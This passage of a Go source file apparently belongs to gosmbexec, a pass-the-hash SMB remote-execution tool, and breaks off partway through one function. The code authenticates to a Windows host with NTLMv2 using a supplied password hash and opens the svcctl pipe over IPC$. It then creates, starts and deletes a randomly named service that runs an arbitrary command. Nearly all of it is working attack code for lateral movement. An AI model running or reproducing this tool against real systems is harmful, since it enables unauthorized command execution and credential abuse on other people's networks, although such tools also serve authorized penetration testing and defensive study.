package smbexec

import (
	"bufio"
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/wadeking98/gosmbexec/helpers"
	"github.com/wadeking98/gosmbexec/pkg"
	"github.com/wadeking98/gosmbexec/pkg/smb"
)

func Run(host string, port uint16, username string, password string, hash string, domain string, command string, commandCOMSPEC string, serviceName string, version string) {
	RunDebug(host, port, username, password, hash, domain, command, commandCOMSPEC, serviceName, version, false)
}

func RunDebug(host string, port uint16, username string, password string, hash string, domain string, command string, commandCOMSPEC string, serviceName string, version string, debug bool) {
	logger := helpers.Logger{Print: debug}
	parsedHash := hash
	if strings.Contains(parsedHash, ":") {
		parsedHash = parsedHash[strings.Index(parsedHash, ":")+1:]
	}

	processID := fmt.Sprintf("%x", helpers.GetCurrentProcessID())
	processIDBytes, _ := hex.DecodeString(processID)
	if len(processIDBytes) > 2 {
		tempBytes := make([]byte, 2)
		copy(tempBytes, processIDBytes[:2])
		processIDBytes = tempBytes
	}
	processIDByteArray := make([]byte, 4)
	copy(processIDByteArray[:], processIDBytes)

	target := host + ":" + strconv.Itoa(int(port))

	config := pkg.NewSmbConfig(&version, &target, &username, &domain, &command, &commandCOMSPEC, &password, &parsedHash, &serviceName, &debug)

	var client net.TCPConn
	client.SetReadDeadline(time.Now().Add(60 * time.Second))

	conn, err := net.Dial("tcp", *config.Target)
	if err != nil {
		logger.Printf("Failed to connect to %s: %s\n", *config.Target, err)
		return
	}
	defer conn.Close()

	stage := ""
	stageNext := ""
	_ = stageNext

	if *config.SmbVersion == "SMB2.1" {
		stage = "NegotiateSMB2"
	} else {
		stage = "NegotiateSMB"
	}

	negotiation_failed := false
	_ = negotiation_failed

	clientStream := bufio.NewWriter(conn)

	clientRecieve := make([]byte, 4096)

	smbSigning := false
	var sessionKeyLength, negotiateFlags []byte
	_ = sessionKeyLength

	messageID := 1
	treeID := []byte{0x00, 0x00, 0x00, 0x00}
	sessionID := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

	loginSuccessful := false

	for stage != "Exit" {
		switch stage {
		case "NegotiateSMB":
			SMB_header := smb.NewPacketSMBHeader([]byte{0x72}, []byte{0x18}, []byte{0x01, 0x48}, []byte{0xff, 0xff}, processIDBytes, []byte{0x00, 0x00})
			SMB_data := smb.NewPacketSMBNegotiateProtocolRequest(*config.SmbVersion)
			NetBIOS_session_service := pkg.NewPacketNetBIOSSessionService(len(SMB_header), len(SMB_data))
			SMB_header = append(SMB_header, SMB_data...)
			content := append(NetBIOS_session_service, SMB_header...)
			_, err := clientStream.Write(content)
			clientStream.Flush()
			conn.Read(clientRecieve)
			if err != nil && *config.Debug {
				logger.Printf("[-] SMB1 negotiation failed with %s \n", *config.Target)
				if *config.Debug {
					logger.Println(err)
				}
				stage = "Exit"
				negotiation_failed = true
				break
			}

			if bytes.Equal(clientRecieve[4:8], []byte{0xff, 0x53, 0x4d, 0x42}) {
				*config.SmbVersion = "SMB1"
				stage = "NTLMSSPNegotiate"

				if clientRecieve[39] == 0x0f {
					if config.SigningCheck {
						logger.Println("[+] SMB signing is required on " + target)
						stage = "Exit"
					} else {
						logger.Println("[+] SMB signing is required")
						smbSigning = true
						sessionKeyLength = []byte{0x00, 0x00}
						negotiateFlags = []byte{0x15, 0x82, 0x08, 0xa0}
					}
				} else {
					if config.SigningCheck {
						logger.Println("[+] SMB signing is not required on " + target)
						stage = "Exit"
					} else {
						smbSigning = false
						sessionKeyLength = []byte{0x00, 0x00}
						negotiateFlags = []byte{0x05, 0x82, 0x08, 0xa0}
					}
				}
			} else {
				stage = "NegotiateSMB2"

				if clientRecieve[70] == 0x03 {
					if config.SigningCheck {
						logger.Println("[+] SMB signing is required on " + target)
						stage = "Exit"
					} else {
						if config.SigningCheck {
							logger.Println("[+] SMB signing is required")
						}
						smbSigning = true
						sessionKeyLength = []byte{0x00, 0x00}
						negotiateFlags = []byte{0x15, 0x82, 0x08, 0xa0}
					}
				} else {
					if config.SigningCheck {
						logger.Println("[+] SMB signing is not required on " + target)
						stage = "Exit"
					} else {
						smbSigning = false
						sessionKeyLength = []byte{0x00, 0x00}
						negotiateFlags = []byte{0x05, 0x80, 0x08, 0xa0}
					}
				}
			}
		case "NegotiateSMB2":

			if *config.SmbVersion == "SMB2.1" {
				messageID = 0
			} else {
				messageID = 1
			}

			treeID = []byte{0x00, 0x00, 0x00, 0x00}
			sessionID = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
			smb2Header := smb.NewPacketSMB2Header([]byte{0x00, 0x00}, []byte{0x00, 0x00}, false, messageID, processIDByteArray[:], treeID, sessionID)
			smb2Data := smb.NewPacketSMB2NegotiateProtocolRequest()
			NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))
			clientSend := append(NetBIOSsessionService, append(smb2Header, smb2Data...)...)
			clientStream.Write(clientSend)
			clientStream.Flush()
			_, err = conn.Read(clientRecieve)
			stage = "NTLMSSPNegotiate"

			if clientRecieve[70] == 0x03 {
				if config.SigningCheck {
					logger.Println("[+] SMB signing is required on " + target)
					stage = "Exit"
				} else {
					if config.SigningCheck {
						logger.Println("[+] SMB signing is required")
					}
					smbSigning = true
					sessionKeyLength = []byte{0x00, 0x00}
					negotiateFlags = []byte{0x15, 0x82, 0x08, 0xa0}
				}
			} else {
				if config.SigningCheck {
					logger.Println("[+] SMB signing is not required on " + target)
					stage = "Exit"
				} else {
					smbSigning = false
					sessionKeyLength = []byte{0x00, 0x00}
					negotiateFlags = []byte{0x05, 0x80, 0x08, 0xa0}
				}
			}
		case "NTLMSSPNegotiate":
			if *config.SmbVersion == "SMB1" {
				packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x73}, []byte{0x18}, []byte{0x07, 0xc8}, []byte{0xff, 0xff}, processIDBytes, []byte{0x00, 0x00})
				if smbSigning {
					packetSMBHeader.Set("Flags2", []byte{0x05, 0x48})
				}
				smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
				NTLMSSPNegotiate := pkg.NewPacketNTLMSSPNegotiate(negotiateFlags, []byte{})
				smbData := smb.NewPacketSMBSessionSetupAndXRequest(NTLMSSPNegotiate)
				NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), len(smbData))
				clientStream.Write(append(NetBIOSsessionService, append(smbHeader, smbData...)...))
			} else {
				messageID++
				smb2Header := smb.NewPacketSMB2Header([]byte{0x01, 0x00}, []byte{0x1f, 0x00}, false, messageID, processIDByteArray[:], treeID, sessionID)
				NTLMSSPNegotiate := pkg.NewPacketNTLMSSPNegotiate(negotiateFlags, []byte{})
				smb2Data := smb.NewPacketSMB2SessionSetupRequest(NTLMSSPNegotiate)
				NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))
				clientStream.Write(append(NetBIOSsessionService, append(smb2Header, smb2Data...)...))
			}

			clientStream.Flush()
			conn.Read(clientRecieve)
			stage = "Exit"

		}

	}

	var SMBUserID []byte
	var sessionKey []byte

	if !config.SigningCheck && !negotiation_failed {

		NTLMSSP := hex.EncodeToString(clientRecieve)
		NTLMSSPIndex := strings.Index(NTLMSSP, "4e544c4d53535000")
		NTLMSSPBytesIndex := NTLMSSPIndex / 2
		domainLength := helpers.GetUInt16DataLength(NTLMSSPBytesIndex+12, clientRecieve)
		targetLength := helpers.GetUInt16DataLength(NTLMSSPBytesIndex+40, clientRecieve)
		sessionID = clientRecieve[44:52]
		NTLMChallenge := clientRecieve[NTLMSSPBytesIndex+24 : NTLMSSPBytesIndex+32]
		targetDetails := clientRecieve[NTLMSSPBytesIndex+56+int(domainLength) : NTLMSSPBytesIndex+56+int(domainLength)+int(targetLength)]
		targetTimeBytes := targetDetails[len(targetDetails)-14 : len(targetDetails)-6]

		var NTLMHashBytes []byte
		for i := 0; i < len(*config.Hash); i += 2 {
			substring := (*config.Hash)[i : i+2]
			NTLMHashBytes = append(NTLMHashBytes, helpers.ParseHex(substring))
		}

		authHostname, _ := os.Hostname()
		authHostnameBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(authHostname)))
		authDomainBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(*config.Domain)))
		authUsernameBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(*config.Username)))
		authDomainLength := make([]byte, 2)
		binary.LittleEndian.PutUint16(authDomainLength, uint16(len(authDomainBytes)))
		authUsernameLength := make([]byte, 2)
		binary.LittleEndian.PutUint16(authUsernameLength, uint16(len(authUsernameBytes)))
		authHostnameLength := make([]byte, 2)
		binary.LittleEndian.PutUint16(authHostnameLength, uint16(len(authHostnameBytes)))
		authDomainOffset := []byte{0x40, 0x00, 0x00, 0x00}
		authUsernameOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(authUsernameOffset, uint32(len(authDomainBytes)+64))
		authHostnameOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(authHostnameOffset, uint32(len(authDomainBytes)+len(authUsernameBytes)+64))
		authLMOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(authLMOffset, uint32(len(authDomainBytes)+len(authUsernameBytes)+len(authHostnameBytes)+64))
		authNTLMOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(authNTLMOffset, uint32(len(authDomainBytes)+len(authUsernameBytes)+len(authHostnameBytes)+88))
		HMACMD5 := hmac.New(md5.New, NTLMHashBytes)
		usernameAndTarget := strings.ToUpper(*config.Username)
		usernameAndTargetBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(usernameAndTarget)))
		usernameAndTargetBytes = append(usernameAndTargetBytes, authDomainBytes...)
		HMACMD5.Write(usernameAndTargetBytes)
		NTLMv2Hash := HMACMD5.Sum(nil)

		clientChallengeBytes := make([]byte, 8)
		for i := 0; i < 8; i++ {
			clientChallengeBytes[i] = byte(rand.Intn(255) + 1)
		}

		securityBlobBytes := []byte{
			0x01, 0x01, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
		}
		securityBlobBytes = append(securityBlobBytes, targetTimeBytes...)
		securityBlobBytes = append(securityBlobBytes, clientChallengeBytes...)
		securityBlobBytes = append(securityBlobBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
		securityBlobBytes = append(securityBlobBytes, targetDetails...)
		securityBlobBytes = append(securityBlobBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
		securityBlobBytes = append(securityBlobBytes, []byte{0x00, 0x00, 0x00, 0x00}...)

		serverChallengeAndSecurityBlobBytes := append(NTLMChallenge, securityBlobBytes...)
		HMACMD5.Reset()
		HMACMD5 = hmac.New(md5.New, NTLMv2Hash)
		HMACMD5.Write(serverChallengeAndSecurityBlobBytes)
		NTLMv2Response := HMACMD5.Sum(nil)

		if smbSigning {
			HMACMD5.Reset()
			HMACMD5.Write(NTLMv2Response)
			sessionBaseKey := HMACMD5.Sum(nil)
			sessionKey = sessionBaseKey
		}

		NTLMv2Response = append(NTLMv2Response, securityBlobBytes...)
		NTLMv2ResponseLength := make([]byte, 2)
		binary.LittleEndian.PutUint16(NTLMv2ResponseLength, uint16(len(NTLMv2Response)))
		sessionKeyOffset := make([]byte, 4)
		binary.LittleEndian.PutUint32(sessionKeyOffset, uint32(len(authDomainBytes)+len(authUsernameBytes)+len(authHostnameBytes)+len(NTLMv2Response)+88))

		NTLMSSPResponse := []byte{
			0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00,
			0x03, 0x00, 0x00, 0x00,
			0x18, 0x00,
			0x18, 0x00,
		}
		NTLMSSPResponse = append(NTLMSSPResponse, authLMOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, NTLMv2ResponseLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, NTLMv2ResponseLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authNTLMOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, authDomainLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authDomainLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authDomainOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, authUsernameLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authUsernameLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authUsernameOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, authHostnameLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authHostnameLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, authHostnameOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, sessionKeyLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, sessionKeyLength...)
		NTLMSSPResponse = append(NTLMSSPResponse, sessionKeyOffset...)
		NTLMSSPResponse = append(NTLMSSPResponse, negotiateFlags...)
		NTLMSSPResponse = append(NTLMSSPResponse, authDomainBytes...)
		NTLMSSPResponse = append(NTLMSSPResponse, authUsernameBytes...)
		NTLMSSPResponse = append(NTLMSSPResponse, authHostnameBytes...)
		NTLMSSPResponse = append(NTLMSSPResponse, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
		NTLMSSPResponse = append(NTLMSSPResponse, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
		NTLMSSPResponse = append(NTLMSSPResponse, NTLMv2Response...)

		var clientSend []byte
		if *config.SmbVersion == "SMB1" {
			SMBUserID = []byte{clientRecieve[32], clientRecieve[33]}
			packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x73}, []byte{0x18}, []byte{0x07, 0xc8}, []byte{0xff, 0xff}, processIDBytes, SMBUserID)

			if smbSigning {
				packetSMBHeader.Set("Flags2", []byte{0x05, 0x48})
			}

			packetSMBHeader.Set("UserID", SMBUserID)
			NTLMSSPNegotiate := pkg.NewPacketNTLMSSPAuth(NTLMSSPResponse)
			smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
			smbData := smb.NewPacketSMBSessionSetupAndXRequest(NTLMSSPNegotiate)
			NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), len(smbData))
			clientSend = append(NetBIOSsessionService, smbHeader...)
			clientSend = append(clientSend, smbData...)
		} else {
			messageID++
			smb2Header := smb.NewPacketSMB2Header([]byte{0x01, 0x00}, []byte{0x01, 0x00}, false, messageID, processIDByteArray[:], treeID, sessionID)
			NTLMSSPAuth := pkg.NewPacketNTLMSSPAuth(NTLMSSPResponse)
			smb2Data := smb.NewPacketSMB2SessionSetupRequest(NTLMSSPAuth)
			NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))
			clientSend = append(NetBIOSSessionService, smb2Header...)
			clientSend = append(clientSend, smb2Data...)

		}

		clientStream.Write(clientSend)
		clientStream.Flush()
		conn.Read(clientRecieve)

		if *config.SmbVersion == "SMB1" {
			if bytes.Equal(clientRecieve[9:13], []byte{0x00, 0x00, 0x00, 0x00}) {
				logger.Printf("[+] %s successfully authenticated on %s\n", *config.Username, *config.Target)
				loginSuccessful = true
			} else {
				logger.Printf("[!] %s failed to authenticate on %s\n", *config.Username, *config.Target)
				loginSuccessful = false
			}
		} else {
			if bytes.Equal(clientRecieve[12:16], []byte{0x00, 0x00, 0x00, 0x00}) {
				logger.Printf("[+] %s successfully authenticated on %s\n", *config.Username, *config.Target)
				loginSuccessful = true
			} else {
				logger.Printf("[!] %s failed to authenticate on %s\n", *config.Username, *config.Target)
				loginSuccessful = false
			}
		}

	}

	if loginSuccessful {
		SMBPath := "\\\\" + host + "\\IPC$"

		var SMBPathBytes []byte
		if *config.SmbVersion == "SMB1" {
			SMBPathBytes = append([]byte(SMBPath), 0x00)
		} else {
			SMBPathBytes = helpers.Uint16ToBytes(utf16.Encode([]rune(SMBPath)))
		}

		namedPipeUUID := []byte{0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03}
		_ = namedPipeUUID

		SMBServiceRandom := []uint16{}
		SMBServiceBytes := []byte{}
		if *config.Service == "" {
			rand.Seed(time.Now().UnixNano())
			for i := 0; i < 20; i++ {
				randNum := uint16(rand.Intn(90-65+1) + 65)
				SMBServiceRandom = append(SMBServiceRandom, randNum)
			}
			SMBServiceBytes = helpers.Uint16ToBytes(SMBServiceRandom)
			SMBServiceBytes = append(SMBServiceBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
		} else {
			SMBServiceBytes = helpers.Uint16ToBytes(utf16.Encode([]rune(*config.Service)))
			if len(SMBServiceBytes)%4 != 0 {
				SMBServiceBytes = append(SMBServiceBytes, []byte{0x00, 0x00}...)
			} else {
				SMBServiceBytes = append(SMBServiceBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
			}
		}

		_ = SMBPathBytes

		smbServiceLength := make([]byte, 4)
		binary.LittleEndian.PutUint32(smbServiceLength, uint32(len(SMBServiceRandom)+1))

		command := ""
		if *config.CommandSpec == "Y" {
			command = "%COMSPEC% /C \"" + *config.Command + "\""
		} else {
			command = "\"" + *config.Command + "\""
		}

		commandBytes := helpers.Uint16ToBytes(utf16.Encode([]rune(command)))

		if len(command)%2 != 0 {
			commandBytes = append(commandBytes, []byte{0x00, 0x00}...)
		} else {
			commandBytes = append(commandBytes, []byte{0x00, 0x00, 0x00, 0x00}...)
		}

		commandLengthBytes := make([]byte, 4)
		binary.LittleEndian.PutUint32(commandLengthBytes, uint32(len(commandBytes)/2))

		smbSplitIndex := 4256
		// var smbSplitIndexTracker, smbSplitStage int
		var SMBTreeID, SMBFID, smbServiceManagerContextHandle, scmData []byte

		var smbCloseServiceHandleStage int
		var SMBSigningCounter int
		if *config.SmbVersion == "SMB1" {
			stage = "TreeConnectAndXRequest"
			for stage != "Exit" {
				switch stage {
				case "CheckAccess":
					if bytes.Equal(clientRecieve[108:112], []byte{0x00, 0x00, 0x00, 0x00}) && !bytes.Equal(clientRecieve[88:108], []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}) {
						smbServiceManagerContextHandleSlice := clientRecieve[88:108]
						smbServiceManagerContextHandle = make([]byte, len(smbServiceManagerContextHandleSlice))
						copy(smbServiceManagerContextHandle, smbServiceManagerContextHandleSlice)
						if *config.Command != "" {
							logger.Printf("%s has Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
							scmData = pkg.NewPacketSCMCreateServiceW(smbServiceManagerContextHandle, SMBServiceBytes, smbServiceLength, commandBytes, commandLengthBytes)

							if len(scmData) < smbSplitIndex {
								stage = "CreateServiceW"
							} else {
								// TODO add support for longer commands
								logger.Println("[-] Command is too long, please use a shorter command and try again")
								stage = "Exit"
							}

						} else {
							logger.Printf("%s has Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
							smbCloseServiceHandleStage = 2
							stage = "CloseServiceHandle"
						}
					} else if bytes.Equal(clientRecieve[108:112], []byte{0x05, 0x00, 0x00, 0x00}) {
						logger.Printf("[-] %s does not have Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
						stage = "Exit"
					} else {
						logger.Printf("[-] Soming went wrong with %s", *config.Target)
						stage = "Exit"
					}
				case "CloseRequest":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x04}, []byte{0x18}, []byte{0x07, 0xc8}, SMBTreeID, processIDByteArray[:], SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBCloseRequest([]byte{0x00, 0x40})
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), len(smbData))

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData)
					}

					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = "TreeDisconnect"
				case "CloseServiceHandle":
					if smbCloseServiceHandleStage == 1 {
						logger.Println("[+] Service deleted on " + *config.Target)
						smbCloseServiceHandleStage++
						scmData = pkg.NewPacketSCMCloseServiceHandle(smbServiceManagerContextHandle)
					} else {
						stage = "CloseRequest"
						scmData = pkg.NewPacketSCMCloseServiceHandle(smbServiceManagerContextHandle)
					}

					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x05, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x00, 0x00}, []byte{})
					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(rpcData)+len(scmData))
					rpcDataLength := len(smbData) + len(scmData) + len(rpcData)
					NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), rpcDataLength)

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData, rpcData, scmData)
					}

					clientSend := append(NetBIOSsessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientSend = append(clientSend, rpcData...)
					clientSend = append(clientSend, scmData...)

					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)

				case "CreateAndXRequest":
					SMBNamedPipeBytes := []byte{0x5c, 0x73, 0x76, 0x63, 0x63, 0x74, 0x6c, 0x00} // \svcctl
					SMBTreeID = clientRecieve[28:30]
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0xa2}, []byte{0x18}, []byte{0x02, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBNTCreateAndXRequest(SMBNamedPipeBytes)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), len(smbData))

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData)
					}

					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = "RPCBind"

				case "CreateServiceW":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					scmData = pkg.NewPacketSCMCreateServiceW(smbServiceManagerContextHandle, SMBServiceBytes, smbServiceLength, commandBytes, commandLengthBytes)
					rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x02, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0c, 0x00}, []byte{})
					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(rpcData)+len(scmData))
					rpcDataLength := len(smbData) + len(scmData) + len(rpcData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), rpcDataLength)

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData, rpcData, scmData)
					}

					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientSend = append(clientSend, rpcData...)
					clientSend = append(clientSend, scmData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = "ReadAndXRequest"
					stageNext = "StartServiceW"

				// case "CreateServiceW_First":
				// 	SMBSplitStageFinal := int(math.Ceil(float64(len(scmData)) / float64(smbSplitIndex)))
				// 	packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

				// 	if smbSigning {
				// 		smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
				// 	}

				// 	scmDataFirst := scmData[:smbSplitIndex]
				// 	packetrpcData := pkg.NewPacketRPCRequestUnflat([]byte{0x01}, 0, 0, 0, []byte{0x02, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0c, 0x00}, scmDataFirst)
				// 	packetrpcData.Set("AllocHint", helpers.Uint16ToBytes([]uint16{uint16(len(scmData))}))
				// 	smbSplitIndexTracker = smbSplitIndex
				// 	_ = smbSplitIndexTracker
				// 	rpcData := helpers.FlattenOrderedMap(*packetrpcData)
				// 	smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
				// 	smbData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(rpcData))
				// 	rpcDataLength := len(smbData) + len(rpcData)
				// 	NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), rpcDataLength)

				// 	if smbSigning {
				// 		smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData, rpcData)
				// 	}

				// 	clientSend := append(NetBIOSSessionService, smbHeader...)
				// 	clientSend = append(clientSend, smbData...)
				// 	clientSend = append(clientSend, rpcData...)
				// 	clientStream.Write(clientSend)
				// 	clientStream.Flush()
				// 	conn.Read(clientRecieve)

				// 	if SMBSplitStageFinal <= 2 {
				// 		stage = "CreateServiceW_Last"
				// 	} else {
				// 		smbSplitStage = 2
				// 		_ = smbSplitStage
				// 		stage = "CreateServiceW_Middle"
				// 	}
				case "DeleteServiceW":
					if bytes.Equal(clientRecieve[88:92], []byte{0x1d, 0x04, 0x00, 0x00}) {
						logger.Println("[+] Command executed with service on " + *config.Target)
					} else if bytes.Equal(clientRecieve[88:92], []byte{0x02, 0x00, 0x00, 0x00}) {
						logger.Println("[-] Service failed to start on " + *config.Target)
					}

					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					scmData = pkg.NewPacketSCMDeleteServiceW(smbServiceManagerContextHandle)
					rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x04, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x02, 0x00}, []byte{})
					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(rpcData)+len(scmData))
					rpcDataLength := len(smbData) + len(scmData) + len(rpcData)
					NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), rpcDataLength)

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData, rpcData, scmData)
					}

					clientSend := append(NetBIOSsessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientSend = append(clientSend, rpcData...)
					clientSend = append(clientSend, scmData...)

					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)

					stage = "ReadAndXRequest"
					stageNext = "CloseServiceHandle"
					smbCloseServiceHandleStage = 1

				case "Logoff":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x74}, []byte{0x18}, []byte{0x07, 0xc8}, []byte{0x34, 0xfe}, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBLogoffAndXRequest()
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), len(smbData))

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData)
					}

					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = "Exit"

				case "OpenSCManagerW":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					scmData := pkg.NewPacketSCMOpenSCManagerW(SMBServiceBytes, smbServiceLength)
					rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), int(0), int(0), []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0f, 0x00}, []byte{})
					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(rpcData)+len(scmData))
					rpcDataLength := len(smbData) + len(scmData) + len(rpcData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), rpcDataLength)

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData, rpcData, scmData)
					}

